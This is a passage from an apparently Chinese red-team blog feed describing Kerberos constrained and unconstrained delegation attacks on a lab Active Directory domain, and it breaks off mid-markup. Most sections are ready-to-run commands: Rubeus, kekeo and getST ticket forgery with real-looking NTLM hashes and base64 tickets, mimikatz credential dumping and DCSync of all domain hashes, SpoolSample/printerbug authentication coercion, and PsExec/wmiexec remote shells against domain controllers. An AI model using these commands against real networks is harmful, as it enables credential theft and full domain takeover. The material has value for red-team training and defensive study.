href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>申请访问自身的可转发服务票据</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用Rubeus申请配置了约束委派机器账户web<span class="number">-2012</span>$的TGT</span><br><span class="line">.\Rubeus.exe asktgt /user:WEB<span class="number">-2012</span>$ /rc4:<span class="number">40</span>ee25b2c3f7ac3370429b18aca51e81 /domain:redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /nowrap</span><br><span class="line"></span><br><span class="line"># 使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存</span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:ldap/ad02<span class="number">-2016.</span>redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /ptt /ticket:doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQ0bC1JFRFRFQU0uUkVEoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZKOCA88wggPLoAMCARKhAwIBAqKCA70EggO5H/WWv61D37Lh8CgUrZXK+OCIcG1ppRSAswcwQuaD4XOCz+v9+wZRJ6xY1DRAQ7HK0fIrp96Z54o0al1nMCGXkKRrq4+UyiTuDABdCUxj/bKj0m/DanX6Bm82LFah0J8CRpFsbt5i1F0U/<span class="number">0</span>t79e8lGbWqmTajaeTgYQrLFmWMUTL8+DQ7E02wth14UY/rBBF/oDwdVhoFovwvkjSiLYx3ePyX20Gmz8IH+<span class="number">1</span>ReqZajI8I4FGn1fV6FSzlUI7eWMumOkV61iV3uW1Zw7OqawRTcbx/<span class="number">33</span>rBjkpKsBCY0Gx41q63a8HiLua1tJZkJOERmUWjr/<span class="number">7</span>EZeZ+RbcgvDT3yOGD1L0y2iHTnGk1+maS3Rbee7EtERg4RmSwXUMnoRsle6/oVFyVdGhpbf8ePiCUY1IQCLNIt7YcleNljrOxSZwPIH1lBwIxiRNrgyhnJbcFKhroZg+dbITKaZYP1j1jcOdlpA2t5qF/kgIcuTSyz7E8bMvm+<span class="number">34</span>TwLjOF+bw+<span class="number">5</span>O3riugezUL0nhZRxxZGYfixtOLTN+wxLfDOvqzBbE9HOSJJOeoxGsktl8y5ULQ1cSxEyYjklxlMrv8/t2jJKJE60VrJS+f+VhYw0de+<span class="number">6</span>AJ08aSWJrfAQQ6T9aAyBFr+flOnx93aIYb5ql6W5rZ9Q5OKDcms/<span class="number">1</span>rIzVDoPdB2ZAQxPkquHB8vFAXO86rKw1k1SauMxn8sOFVdocF56eWHIEUegVe4mpGLipQMTMJnFCGhuq1IlLZbPTnFykDM9cR+FZb3d5uUN45BGIS2TEKtie6yBROP5mX3F6273srlBM/XOgOUXPnradx1RUPJ2zEM9L8PYKKm516wTJLirmAYRI4FSdQ3hHuMLeTrHNE8BggLf1AhTQizCf7iUJFf7hJv09gIugLFNXtqakKFeAnxz7Ej+X9Q3xyaR39IBIKPrtd/ChkbDZYiID9n31sGQ4oTyYEQDoef4zIhq/x3qRxeroCFKG4yRdVKo8eBEq4a5TPuHIbstXO<span class="comment">//3ZAcxFmK8Kcs+PHbkgyDyGiLdhf2GjnGDtBL1Hj4nJHVCXZR49XNhpCKY2iG/JkVq0RFoxn1X06BY7WcMQybIoXeD0jjXrEQn7Qh6xe6SsRsu5YU0npq8TBEcI6F3wtzGZX9KMLnHIRRfcsBlCLi5LOgIl/byAkR/ImxzlhVi/TxDn1p3kDOj+qHzcayOm0SBzr4kES/T6DCsoSCaeAYUzR5CSn4hnEtTzoTJGmAgR602Hp2HymQSfjlQQk9rqPiZCGLg7i+3GjgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCrZ+acKyJr6OeDK5YKeYM0oQ0bC1JFRFRFQU0uUkVEohYwFKADAgEBoQ0wCxsJV0VCLTIwMTIkowcDBQBA4QAApREYDzIwMjMwMjA3MDgzOTM4WqYRGA8yMDIzMDIwNzE4MzkzOFqnERgPMjAyMzAyMTQwODM5MzhaqA0bC1JFRFRFQU0uUkVEqSAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZA==</span></span><br><span class="line"></span><br><span class="line"># 直接dir</span><br><span class="line">dir \\ad02<span class="number">-2016.</span>redteam.red\c$</span><br></pre></td></tr></table></figure><p><img src="/6.png" alt="image.png"></p><h4 id="方法3：使用机器账户的Hash值-getST"><a href="#方法3：使用机器账户的Hash值-getST" class="headerlink" title="方法3：使用机器账户的Hash值 | getST"></a>方法3：使用机器账户的Hash值 | getST</h4><p>同思路2一致，也是使用机器账户的Hash值，但这里使用Impacket工具套件中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py" target="_blank" rel="noopener">getST.py</a>脚本请求服务票据，并利用该脚本通过<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a>工具远程登录<br>利用条件：</p><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz获取机器账户NTLM Hash值</span><br><span class="line">mimikatz.<span class="keyword">exe</span> <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"># 使用getST申请服务票据</span><br><span class="line">.\getST.<span class="keyword">exe</span> -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -spn cifs/ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -impersonate administrator redteam.<span class="keyword">com</span>/web-<span class="number">2012</span>$ -hashes :<span class="number">1</span>d01ff5cd4825306ff1a7599204525ec</span><br><span class="line"></span><br><span class="line"># 使用票据远程访问</span><br><span class="line"><span class="keyword">set</span> KRB5CCNAME=administrator.ccache </span><br><span class="line">.\wmiexec.<span class="keyword">exe</span> -<span class="keyword">k</span> redteam.<span class="keyword">com</span>/administrator@ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -<span class="keyword">no</span>-pass -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -codec gbk</span><br></pre></td></tr></table></figure><img src="/7.png" alt="image.png"></li></ol><h4 id="方法4：使用机器账户的Hash值-kekeo"><a href="#方法4：使用机器账户的Hash值-kekeo" class="headerlink" title="方法4：使用机器账户的Hash值 | kekeo"></a>方法4：使用机器账户的Hash值 | kekeo</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:web-2012$ /domain:redteam.red /NTLM:40ee25b2c3f7ac3370429b18aca51e81"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请administrator权限的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgs::s4u /tgt:TGT_web-2012$@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:ldap/ad02-2016.redteam.red"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## kekeo注入票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@redteam.red_ldap~ad02-2016.redteam.red@redteam.red.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz通过ldap服务导出hash</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_ldap~ad02-2016.redteam.red@REDTEAM.RED.kirbi"</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir \\ad02-<span class="number">2016</span>.redteam.red\c$</span><br><span class="line"></span><br><span class="line"><span class="comment"># psexec</span></span><br><span class="line">.\Psexec.exe -accepteula \\ad02-<span class="number">2016</span>.redteam.red cmd</span><br></pre></td></tr></table></figure><p><img src="/8.png" alt="image.png"><br>ldap账户<br><img src="/9.png" alt="image.png"></p><h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><blockquote><p>域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p></blockquote><h4 id="方法1：使用服务账户的票据-kekeo"><a href="#方法1：使用服务账户的票据-kekeo" class="headerlink" title="方法1：使用服务账户的票据 | kekeo"></a>方法1：使用服务账户的票据 | kekeo</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 通过<span class="selector-tag">kekeo</span>请求服务用户的<span class="selector-tag">TGT</span></span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:saulgoodman</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.red</span> /<span class="selector-tag">password</span><span class="selector-pseudo">:Saul</span>!@<span class="selector-id">#456</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:test.kirbi</span></span><br><span class="line"></span><br><span class="line">## 同理此处利用<span class="selector-tag">ntlm</span> <span class="selector-tag">hash</span>也是可以进行请求的</span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:websec</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.club</span> /<span class="selector-tag">NTLM</span><span class="selector-pseudo">:XXXXX</span></span><br></pre></td></tr></table></figure><p><img src="/10.png" alt="image.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用票据通过伪造S4U请求以administrator身份访问websec的ST</span></span><br><span class="line">tgs::s4u /<span class="symbol">tgt:</span>TGT_saulgoodman<span class="variable">@REDTEAM</span>.RED_krbtgt~redteam.red<span class="variable">@REDTEAM</span>.RED.kirbi /<span class="symbol">user:</span>Administrator<span class="variable">@redteam</span>.red /<span class="symbol">service:</span>cifs/AD02<span class="number">-2016</span>.redteam.red</span><br></pre></td></tr></table></figure><p><img src="/11.png" alt="image.png"></p><p>kekeo当前路径下会出现administrator的ticket (用于访问saulgoodman的CIFS服务), 访问saulgoodman的cifs服务: 使用kekeo导入票据访问域控。<br><strong>cifs服务</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## kekeo导入这个tiket</span></span><br><span class="line">kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD02-<span class="number">2016.redteam</span>.red@REDTEAM.RED.kirbi</span><br><span class="line"></span><br><span class="line"><span class="comment">## cmd</span></span><br><span class="line">.<span class="string">\PsExec.exe</span> <span class="string">\\ad02-2016.redteam.red</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="comment">## dir</span></span><br><span class="line">dir <span class="string">\\ad02-2016.redteam.red\c$</span></span><br></pre></td></tr></table></figure><p><img src="/12.png" alt="image.png"></p><p><img src="/13.png" alt="image.png"></p><p><strong>ldap服务</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## <span class="selector-tag">mimikatz</span>导入<span class="selector-tag">ptt</span></span><br><span class="line"><span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">TGS_Administrator</span><span class="keyword">@redteam</span>.red<span class="keyword">@REDTEAM</span>.RED_cifs~AD02-2016.redteam.red<span class="keyword">@REDTEAM</span>.RED.kirbi</span><br><span class="line"></span><br><span class="line">## mimikatz不用本机管理员，导入kiket即可不用 <span class="string">"privilege::debug"</span></span><br><span class="line"><span class="attribute">lsadump:</span>:dcsync /<span class="attribute">domain:</span>redteam.com /all /csv</span><br></pre></td></tr></table></figure><p><img src="/14.png" alt="image.png"></p><p><img src="/15.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 委派 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非约束性委派</title>
      <link href="/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/"/>
      <url>/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户<strong>访问任意服务。</strong><br>如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务。</p><a id="more"></a><p><img src="/1.png" alt="image.png"></p><ol><li>用户向KDC请求可转发TGT，记为TGT1</li><li>KDC返回TGT1</li><li>用户通过TGT1向KDC请求转发TGT2</li><li>KDC返回TGT2</li><li>用户通过TGT1向KDC申请访问服务1的RST</li><li>KDC返回RST</li><li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li><li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li><li>KDC给服务1返回服务2的RST</li><li>服务1以用户名义向服务2发出请求</li><li>服务2响应服务1的请求</li><li>服务1响应用户第7步骤的请求</li></ol><p>这个流程的问题在于：<strong>TGT2不被限制，服务1完全可以用它来请求访问任何想访问的服务。</strong> 攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p><h2 id="配置非约束委派"><a href="#配置非约束委派" class="headerlink" title="配置非约束委派"></a>配置非约束委派</h2><h3 id="机器账户配置"><a href="#机器账户配置" class="headerlink" title="机器账户配置"></a>机器账户配置</h3><p><img src="/2.png" alt="image.png"></p><h3 id="服务账户配置"><a href="#服务账户配置" class="headerlink" title="服务账户配置"></a>服务账户配置</h3><p>域账户注册SPN成为服务账户</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/win10<span class="selector-class">.redteam</span><span class="selector-class">.red</span> susan #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web-<span class="number">2012</span><span class="selector-class">.redteam</span><span class="selector-class">.red</span> web-<span class="number">2012</span> #web-<span class="number">2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web-<span class="number">2012</span><span class="selector-class">.redteam</span>.red</span><br></pre></td></tr></table></figure><p><img src="/3.png" alt="image.png"></p><h2 id="侦察手段"><a href="#侦察手段" class="headerlink" title="侦察手段"></a>侦察手段</h2><blockquote><p>当服务账号或主机被设置为非约束性委派时，其userAccountControl属性会包含TRUSTED_FOR_DELEGATION，而TRUSTED_FOR_DELEGATION的标志位，对应的值是0x80000，也即是524288。当前账户值为66048，而590336-66048&#x3D;524288</p></blockquote><p><img src="/4.png" alt="image.png"></p><h3 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询非约束机器账户</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=red"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">dn</span></span><br><span class="line"> </span><br><span class="line"># 查询非约束委派服务账户</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">dn</span></span><br></pre></td></tr></table></figure><h3 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查找非约束机器账户</span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> redteam.com -DomainController AD01<span class="number">-2016</span></span><br><span class="line"></span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetComputer -<span class="keyword">Filter</span> "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -DomainController AD01<span class="number">-2016</span></span><br><span class="line"></span><br><span class="line"># 查找非约束服务账户</span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetUser -<span class="keyword">Filter</span> "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -DomainController AD01<span class="number">-2016</span></span><br></pre></td></tr></table></figure><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><h4 id="方法1：构造服务账户票据"><a href="#方法1：构造服务账户票据" class="headerlink" title="方法1：构造服务账户票据"></a>方法1：构造服务账户票据</h4><p>利用条件：</p><ol><li>服务账户设置了非约束性委派</li><li>已知服务账户的密码口令信息</li></ol><p>这里已知mssqlsrv服务账户密码password，并且ken设置了非约束性委派<br>    使用<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具进行操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造服务账户ken的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:saulgoodman /domain:redteam.com /password:Saul!@#456 /ticket:saulgoodman.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用刚才伪造的ken票据，向域服务器申请CIFS服务票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"Tgs::s4u /tgt:TGT_saulgoodman@REDTEAM.COM_krbtgt~redteam.com@REDTEAM.COM.kirbi /user:administrator@redteam.com /service:cifs/AD01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用mimikatz将该票据注入当前的会话中，</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_administrator@redteam.com@REDTEAM.COM_saulgoodman@REDTEAM.COM.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问目标共享盘</span></span><br><span class="line">dir \\ad01<span class="literal">-2016</span>\C<span class="variable">$</span></span><br></pre></td></tr></table></figure><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：诱使域管理员访问机器"><a href="#方法1：诱使域管理员访问机器" class="headerlink" title="方法1：诱使域管理员访问机器"></a>方法1：诱使域管理员访问机器</h4><blockquote><p>偏理想化，不实用</p></blockquote><p>当域管理员使用net use等远程访问命令，模拟域控管理员访问WIN7主机，设置了非约束性委派的主机可以抓取到域控管理员的TGT。<br>利用条件：</p><ol><li>需要Administrator权限</li><li>域内主机的机器账户开启非约束委派</li><li>域控管理员远程访问</li></ol><p>假设域控管理员执行：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 域控用户访问域内主机</span><br><span class="line"><span class="keyword">net</span> <span class="keyword">use</span> \\WIN10-1.redteam.<span class="keyword">lab</span></span><br></pre></td></tr></table></figure><p>导出票据，执行攻击</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 域内主机导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 查看票据</span></span><br><span class="line">mimikatz.exe <span class="string">"kerberos::list"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 清空票据，可以使用绝对路径</span></span><br><span class="line">kerberos::purge [ticket]</span><br></pre></td></tr></table></figure><p><img src="/5.png" alt="image.png"></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导入内存</span></span><br><span class="line">mimikatz.exe <span class="string">"kerberos::ptt [0;cfd6c]-2-0-60a10000-Administrator@krbtgt-REDTEAM.LAB.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 访问目标盘</span></span><br><span class="line">dir \\DC2016.redteam.lab\c$</span><br></pre></td></tr></table></figure><p><img src="/6.png" alt="image.png"></p><h4 id="方法2：结合打印机漏洞（SpoolSample）"><a href="#方法2：结合打印机漏洞（SpoolSample）" class="headerlink" title="方法2：结合打印机漏洞（SpoolSample）"></a>方法2：结合打印机漏洞（SpoolSample）</h4><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。<br>利用条件：</p><ol><li>需要Administrator权限</li><li>需要2012 R2以上，2012 r2以下版本不在rpc中暴露Spooler服务</li></ol><p>利用过程：<br>使用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>工具监听</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询打印服务是否开启|域控上查看</span></span><br><span class="line">sc query spooler</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Rubeus监听来自域控的票据,1秒一次</span></span><br><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:ad01-2016$</span><br></pre></td></tr></table></figure><p><img src="/7.png" alt="image.png"><br>使用<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a>工具执行打印机漏洞利用，进行强制验证</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 强制回连，获得域控机器账户的TGT</span><br><span class="line">SpoolSample.<span class="keyword">exe</span> ad01-<span class="number">2016</span> web-<span class="number">2012</span></span><br><span class="line"></span><br><span class="line">## 域外工具</span><br><span class="line"><span class="keyword">python</span> dementor.<span class="keyword">py</span> -d domain -<span class="keyword">u</span> username -<span class="keyword">p</span> password 回连ip 目标ip</span><br><span class="line"><span class="keyword">python3</span> printerbug.<span class="keyword">py</span> redteam.<span class="keyword">com</span>/admin:<span class="string">"Aa123456"</span>@<span class="number">192.168</span>.<span class="number">10.250</span>  回连主机</span><br></pre></td></tr></table></figure><p><img src="/8.png" alt="image.png"><br>Rubeus监听到票据并导入该票据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rubeus导入票据</span></span><br><span class="line">Rubeus.exe ptt <span class="regexp">/ticket:doIFGjCCBRagAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoQ0bC1JFRFRFQU0uTEFCoiAwHqADAgECoRcwFRsGa3JidGd0GwtSRURURUFNLkxBQqOCA90wggPZoAMCARKhAwIBAqKCA8sEggPHdOzGGhqNLMiflfgJCrXq6OzfDy1u+wHM8mdH8IpkVEbl+TX5liKAPQ/i</span>4nIewzu9yq8kO9tEZYRhARky6B2Bw4RWD6tx9nytF24Q6AhvpzIfxAK2zJ1fLX5AtH9yyqbVVdd+ryoR8PjUCl09IdyfdmTfMW45olQhHVMG1l2Oz9agg8tUANOFT9HjbxrDJjgCvFMEJ7hJ3s1dsYORZfvXk31J4fn3VRLHj<span class="regexp">/5N9XpQQ5n8T24p8KGmvfK/</span>SdPDU4im<span class="regexp">/Jud5syF60l1sMH/</span>UUr4UYaHSAFM3ui1sgaeO45MdPq7hAVVRaBX8WjogadUTeRghh47nH4aAsbAqxmmCNkTKkYSAPdc8fKIAFQNSONpEsBnaCrLo+QoD<span class="regexp">/x+VIkNHbPYA7Zt3kb/</span>neoH65zP5PTm95pAjmnx7P56<span class="regexp">/UdwgxkVTd7KHsj4VQ/</span><span class="number">7</span>BsHx8GfpXKcmev08KSGvMvXM6+zr9XbrnLne6bnabNTUHuqfh6+<span class="number">4</span>qImMlig6RMmeSpJa0hFAzJdhzkZGO9LLL2OZSOME2ngSvffCunaNqdIGEbev8i5kVMhwg4upv9tClWW+h0mEJWeZ332WF2LKI2VEKjQePAbkM3UUmr+<span class="number">1</span>vUXKEcKPEqQ58fQH2+Nr4naONswOTVb1CLdXB7<span class="regexp">/SdfCcYU26Pgm7vQnl2uNb6LhlpPYAXGoaofUjRV0d3JIR+2oXSt5ia5auCyhU6/</span>nKXPP1KBCiQzjRACSOyeRivxTaxVZExbtLNi932psyMOKCb6qE<span class="regexp">/JHyhve5Iu/</span>nBp78RcfjoTrNaqUCO<span class="regexp">/ZxA2AUlUEpcmoU+Vmm+fQEb828EZtKFoyxKPBKtbK/</span>jLsgk8qEoy5JwIEmMIeIP0D95vc+Rzp5A<span class="regexp">/WSiN0yn9RXqd8On/</span>UBjOW7O42uKhrVJrJ5ClOu+HdHN2WkejBkslnBJYSaL+A69eA5qb+yAJhJqmlSFupfGhQhzm<span class="regexp">/YNDdcifKU+47R3WF3n9OvSqQgLush9/</span>hkGPgwVLp1Wj6LQHzofIujVRDOybAeNt+lATwzQGVHpeUOWy<span class="regexp">/iXV/</span>UxTPGT3VBiPpIm1E813QKw8eWTxLm5YeQJrk0Uyj<span class="regexp">/qalqqo5gskI0fY7Sq60pMA9t1TA6nrdmcQzesKWAcf6QmEmQorTcPw4znaM5QSKAGwRQRGGt57RADimgrs/</span>R2K3Rqa3C<span class="regexp">/ePlSgaPJN3jS5AGHF9j1/</span>MJE0Eb8ZwPXTI0P77NCDWthqK7wFzcyKkrpNjodMf<span class="regexp">/KFs96wkVqWBJ0Xy5qza9rFy/</span>r79WZtICfxLfbdF8KGrS5LCCIYKMVhPq56OB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIP6GQ<span class="regexp">/T97TyQDQUyz2ZnOBxcZEcgQ0iexOoMgGUOzdNUoQ0bC1JFRFRFQU0uTEFCohQwEqADAgEBoQswCRsHREMyMDE2JKMHAwUAYKEAAKURGA8yMDIyMDUxODA3NDcxMFqmERgPMjAyMjA1MTgxNzQ3MTBapxEYDzIwMjIwNTI1MDc0NzEwWqgNGwtSRURURUFNLkxBQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLUkVEVEVBTS5MQUI=</span></span><br></pre></td></tr></table></figure><p><img src="/9.png" alt="image.png"></p><p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>导出Hash</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz导出域内用户Hash</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="/10.png" alt="image.png"></p><p>使用psexec远程登录：</p><figure 